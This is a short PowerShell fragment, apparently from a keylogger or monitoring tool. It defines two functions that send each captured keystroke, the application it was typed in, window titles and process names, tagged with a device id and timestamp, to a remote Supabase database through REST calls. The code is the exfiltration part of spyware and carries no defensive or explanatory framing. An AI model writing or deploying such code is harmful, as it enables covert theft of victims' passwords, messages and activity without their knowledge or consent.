function Send-KeyLog($keystroke, $appName) {
    $payload = @{
        device_id = $device_id
        keystroke = $keystroke
        app_name  = $appName
        timestamp = (Get-Date).ToString("o")
    } | ConvertTo-Json -Depth 3

    Invoke-RestMethod -Uri "$SUPABASE_URL/rest/v1/key_logs" -Headers $headers -Method Post -Body $payload | Out-Null
}

function Send-ActivityLog($windowTitle, $processName) {
    $payload = @{
        device_id    = $device_id
        window_title = $windowTitle
        process_name = $processName
        timestamp    = (Get-Date).ToString("o")
    } | ConvertTo-Json -Depth 3

    Invoke-RestMethod -Uri "$SUPABASE_URL/rest/v1/activity_logs" -Headers $headers -Method Post -Body $payload | Out-Null
}
